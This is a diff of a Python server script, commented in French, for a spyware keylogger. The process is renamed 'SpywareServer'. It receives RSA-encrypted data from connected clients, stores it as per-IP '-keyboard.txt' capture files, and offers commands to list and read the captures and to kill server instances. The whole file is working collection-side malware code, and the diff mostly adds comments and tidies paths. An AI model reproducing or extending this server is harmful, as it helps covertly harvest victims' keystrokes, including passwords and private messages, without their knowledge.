@@ -25,14 +25,11 @@ group.add_argument("-k", "--kill", help="stop all the instances of the server an
 args = parser.parse_args()
 
 
-#Variables
-
-cwd = Path.cwd()
-path_captures = cwd / "captures"
+#Chemin vers le dossier captures qui contient les fichiers txt
+path_captures = "captures"
 
 
-# Classes
-
+# Classe StoppableThread qui permet de créer un thread
 class StoppableThread(Thread):
     def __init__(self, conn, addr, key):
         super(StoppableThread, self).__init__()
@@ -55,6 +52,7 @@ class StoppableThread(Thread):
                 # Réception des données
                 data = rsa.decrypt(self.conn.recv(1024), key).decode()
 
+                # si la donnée reçue est vide, le client est mort
                 if data == "":
                     print("client dead ?")
                     return_code[0] = "STOP"
@@ -67,17 +65,17 @@ class StoppableThread(Thread):
                     if return_code[0] == "OK":
                         self.conn.send("OK".encode("utf-8"))
 
-
             except Exception as e:
                 return_code[0] = "ERROR"
                 print(f"Error Main : {e}")
 
             
-
+        # déchiffrement des données
         data = rsa.decrypt(self.conn.recv(1024), key).decode()
 
         # si des données ont été réceptionnées
         if data:
+            # traitement des données
             handle_data(data, self.addr)
 
             print("send stop code")
@@ -85,7 +83,7 @@ class StoppableThread(Thread):
 
             # temps de pause pour éviter de couper la connexion au moment de l'envoi du code STOP
             time.sleep(1)
-
+        # fermeture de la connexion
         self.conn.close()
 
 
@@ -93,26 +91,28 @@ class StoppableThread(Thread):
 
 # Fonctions
 
+# Fonction qui permet de traiter les données reçues
 def handle_data(data, addr):
 
-    fic = list(path_captures.glob(f"{addr[0]}*.txt"))
-    filename = path_captures / f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
+    # Fic contient la liste des fichiers qui commencent par l'adresse IP du client
+    fic = list(Path(path_captures).glob(f"{addr[0]}*.txt"))
+    # filename contient le nom du fichier qui sera créé
+    filename = Path(path_captures) / f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
     
+    # Si le fichier n'existe pas, on le crée et on écrit les données dedans
     if fic == []:
         with open(filename, 'w') as file:
             file.write(data)
+    # Sinon on écrit les données dans le fichier existant et on le renomme avec le timestamp mis à jour
     else:
         ficfilename = fic[0]
         with open(ficfilename, 'w') as file:
             file.write(data)
         os.rename(ficfilename,filename)
 
-    # print(f"Data received and saved")
-
-
-
+# Fonction qui permet d'afficher la liste des fichiers capturés
 def display_files():
-    files = os.listdir(path_captures)
+    files = os.listdir(Path(path_captures))
     print("List of files captured :")
     for file in files:
         print(" - " + file)
@@ -121,23 +121,26 @@ def display_files():
         print("No files captured yet")
 
 
-
+# Fonction qui permet de lire le contenu d'un fichier
 def read_file(filename):
     try:
-        fic = list(path_captures.glob(f"*{filename}*"))
+        # fic contient la liste des fichiers qui contiennent le nom du fichier entré par l'utilisateur
+        fic = list(Path(path_captures).glob(f"*{filename}*"))
 
+        # Si aucun fichier n'est trouvé, on affiche File not found
         if fic == []:
             print("File not found")
 
+        # Si un seul fichier est trouvé, on affiche son contenu
         elif len(fic) == 1 :
             with open (fic[0], "r") as file:
                 print(f"File content ({fic[0].name}) :")
                 content = file.read()
                 print(content)
-
+        # Si plus de 5 fichiers sont trouvés, on affiche Too many files found
         elif len(fic) > 5 :
             print("Too many files found ! \nPlease be more specific")
-
+        # Sinon on affiche la liste des fichiers trouvés et on demande à l'utilisateur lequel il veut lire
         else:
             print("Several files found :")
 
@@ -164,57 +167,7 @@ def read_file(filename):
 
 
 
-# def handle_client(conn):
-
-#     return_code = ["OK"]
-
-
-#     while return_code[0] == "OK":
-#         try:
-    
-#             # Réception des données
-#             print("wait for data")
-#             data = rsa.decrypt(conn.recv(1024), key).decode()
-
-#             print(f"Data received : {data}")
-
-#             if data == "":
-#                 print("client dead ?")
-#                 return_code[0] = "STOP"
-
-#             # si des données ont été réceptionnées
-#             if data:
-#                 handle_data(data, addr)
-
-#                 # renvoyer un code
-#                 if return_code[0] == "OK":
-#                     print("[+] Keep running")
-#                     conn.send("OK".encode("utf-8"))
-
-
-#         except Exception as e:
-#             return_code[0] = "ERROR"
-#             print(f"Error Main : {e}")
-
-        
-
-#     data = conn.recv(1024).decode('utf-8')
-
-#     # si des données ont été réceptionnées
-#     if data:
-#         handle_data(data, addr)
-
-#         print("send stop code")
-#         conn.send("STOP".encode("utf-8"))
-
-#         # temps de pause pour éviter de couper la connexion au moment de l'envoi du code STOP
-#         time.sleep(1)
-
-#     conn.close()
-
-
-
-
+# Fonction qui permet de récupérer les instances du serveur
 def get_server_instances():
     procs = []
 
@@ -222,17 +175,19 @@ def get_server_instances():
     for proc in psutil.process_iter():
         if "SpywareServer" == proc.name():
             procs.append(proc.pid)
-
+    # retourne la liste des processus qui ont le nom SpywareServer
     return procs
 
 
-
+# Fonction qui permet d'arrêter le serveur
 def stop_server(signal=None, frame=None, threads=None, socket_server=None):
 
+    # Si des threads ont été créés, on les arrête
     if threads != None:
         for th in threads:
             th.stop()
     
+    # Si le socket a été créé, on le ferme
     socket_server.close()
 
     print(f"stoping server. host : {host}")
@@ -240,11 +195,10 @@ def stop_server(signal=None, frame=None, threads=None, socket_server=None):
     exit()
 
 
-
 # Traitement
-
+# Si l'argument listen est renseigné
 if args.listen:
-
+    # changement du nom du processus par SpywareServer
     setproctitle.setproctitle("SpywareServer")
     
     # Configuration du socket
@@ -258,13 +212,14 @@ if args.listen:
 
     print(f"Server listening on {host}:{port}")
 
-
+    # chargement de la clé privée
     with open("rsa/private.pem", mode='rb') as f:
         key = rsa.PrivateKey.load_pkcs1(f.read())
 
-
+    # création de la liste des threads
     threads = []
 
+    # interception du signal SIGTERM
     partial_stop_server = partial(stop_server, threads=threads, socket_server=socket_server)
     signal.signal(signal.SIGTERM, partial_stop_server)
 
@@ -276,9 +231,8 @@ if args.listen:
             conn, addr = socket_server.accept()
 
             print("[+] Connexion acceptée")
-            print(conn)
-            print(addr)
 
+            # création du thread
             th = StoppableThread(conn=conn, addr=addr, key=key)
             th.name = "SpywareThread"
             th.start()
@@ -314,26 +268,28 @@ if args.listen:
 
 
 
-
+# Si l'argument show est renseigné on affiche la liste des fichiers capturés
 elif args.show:
     display_files()
     sys.exit()
 
 
-
+# Si l'argument readfile est renseigné on affiche le contenu du fichier entré par l'utilisateur
 elif args.readfile:
     read_file(args.readfile)
     sys.exit()
 
 
-
+# Si l'argument kill est renseigné on arrête toutes les instances du serveur
 elif args.kill:
     print("kill all the instances")
     
+    # récupération des instances du serveur dans la liste procs
     procs = get_server_instances()
 
     print(f"{len(procs)} instances found")
 
+    # itération sur les instances du serveur et arrêt de chaque instance
     for proc in procs:
         try:
             os.kill(proc, signal.SIGTERM)
